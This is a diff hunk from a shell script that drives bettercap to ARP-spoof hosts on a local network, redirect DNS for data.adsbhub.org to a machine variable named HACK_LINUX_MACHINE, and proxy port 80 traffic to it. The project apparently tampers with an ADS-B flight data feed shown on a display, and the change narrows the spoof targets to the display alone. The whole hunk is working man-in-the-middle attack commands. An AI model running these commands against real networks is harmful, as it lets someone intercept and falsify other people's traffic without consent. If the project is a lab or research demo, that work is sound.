@@ -8,7 +8,7 @@ DOMAIN="data.adsbhub.org"
 # Disconnect ip forwarding
 sudo sysctl -w net.ipv4.ip_forward=1
 
-sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $PI_ADDRESS,$DISPLAY_ADDRESS; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on;set any.proxy.iface $INTERFACE; set any.proxy.protocol TCP;set any.proxy.src_port 80;set any.proxy.dst_address $HACK_LINUX_MACHINE; set any.proxy.dst_port 5000;any.proxy on;"
+sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $DISPLAY_ADDRESS; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on;set any.proxy.iface $INTERFACE; set any.proxy.protocol TCP;set any.proxy.src_port 80;set any.proxy.dst_address $HACK_LINUX_MACHINE; set any.proxy.dst_port 5000;any.proxy on;"
 # sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $HACK_HOST_MACHINE; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on"
 # sudo bettercap -iface $INTERFACE -eval "
 #   set arp.spoof.targets   $DISPLAY_ADDRESS
